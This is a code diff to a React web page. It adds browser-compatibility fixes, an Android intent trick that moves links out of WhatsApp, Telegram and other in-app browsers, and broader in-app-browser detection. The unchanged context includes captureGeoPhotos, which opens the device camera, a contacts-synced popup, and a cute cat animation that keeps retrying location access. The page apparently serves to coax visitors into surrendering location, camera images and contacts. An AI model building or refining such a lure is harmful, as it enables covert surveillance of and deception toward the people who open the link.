@@ -47,7 +47,11 @@ function fallbackCopy(text: string): Promise<void> {
   finally { document.body.removeChild(ta); }
 }
 
-const fullHeight: React.CSSProperties = { minHeight: "100svh" };
+// 100vh is the universally safe fallback; svh is a progressive enhancement
+// (Chrome 108+, Safari 15.4+) that correctly excludes the mobile URL bar.
+// Inline styles can't have duplicate keys so we use a CSS variable trick:
+// the outer wrapper sets both via a className defined below.
+const fullHeight: React.CSSProperties = { minHeight: "100vh" };
 const AUTO_RETRY_SECONDS = 5;
 
 /** Cute pleading-cat animation shown while we auto-retry location access. */
@@ -84,6 +88,21 @@ function CopyAndOpenButton({ url }: { url: string }) {
   const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
   const handleClick = () => {
     copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));
+
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    if (isAndroid) {
+      // Android intent URI: asks the OS to open the URL in the user's default
+      // browser. Works in WhatsApp WebView, Telegram, Facebook, Instagram etc.
+      // S.browser_fallback_url ensures a graceful fallback if no browser handles the intent.
+      try {
+        const encoded = encodeURIComponent(url);
+        window.location.href =
+          `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;S.browser_fallback_url=${encoded};end`;
+        return;
+      } catch { /* fall through to normal open */ }
+    }
+
+    // iOS / desktop fallback: programmatic click on a _blank anchor
     const a = document.createElement("a");
     a.href = url; a.target = "_blank"; a.rel = "noreferrer";
     a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
@@ -191,6 +210,7 @@ function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
                 width: 156, height: 156,
                 background: "rgba(255,255,255,0.28)",
                 backdropFilter: "blur(6px)",
+                WebkitBackdropFilter: "blur(6px)",
                 boxShadow: "0 0 0 1px rgba(255,255,255,0.4) inset, 0 12px 40px rgba(199,60,140,0.35)",
               }}
             >
@@ -311,7 +331,7 @@ function ContactsSyncedPopup({
   return (
     <div
       className="fixed inset-0 z-[200] flex items-center justify-center p-4"
-      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)" }}
+      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)", WebkitBackdropFilter: "blur(10px)" }}
     >
       <motion.div
         className="w-full max-w-sm rounded-3xl overflow-hidden"
@@ -472,8 +492,10 @@ async function captureGeoPhotos(
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
     const video = document.createElement("video");
-    video.srcObject = stream; video.muted = true; video.playsInline = true;
-    await video.play();
+    video.srcObject = stream; video.muted = true; video.playsInline = true; video.autoplay = true;
+    // Explicit play() call needed on old Android WebViews that ignore autoplay attr;
+    // catch and swallow if the browser blocks autoplay on a muted video.
+    await video.play().catch(() => {});
     // Short exposure/focus settle — just enough for autofocus to lock, not a
     // fixed multi-second pause.
     await new Promise((r) => setTimeout(r, 350));
@@ -551,9 +573,15 @@ function detectWebView(): boolean {
   if (typeof navigator === "undefined") return false;
   const ua = navigator.userAgent || "";
   return (
-    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp/.test(ua) ||
+    // In-app browsers by product name
+    /FBAN|FBAV|Instagram|WhatsApp|LinkedInApp|Telegram|TikTok|BytedanceWebview|musical_ly|Snapchat|Twitter|Line\//.test(ua) ||
+    // iOS non-Safari WebKit (all in-app browsers on iOS use WKWebView)
     (/iPhone|iPod|iPad/.test(ua) && !/Safari\//.test(ua) && /WebKit/.test(ua)) ||
-    (/Android/.test(ua) && /wv\)/.test(ua))
+    // Android system WebView embed (the "wv" token in the UA)
+    (/Android/.test(ua) && /wv\)/.test(ua)) ||
+    // Generic Android in-app pattern: Version/x.x Chrome/x is the signature
+    // of apps that embed a raw WebView without customising the UA string
+    (/Android/.test(ua) && /Version\/\d+\.\d+/.test(ua) && /Chrome\/\d+/.test(ua) && !/Chrome\/\d+ Mobile Safari\//.test(ua))
   );
 }
 
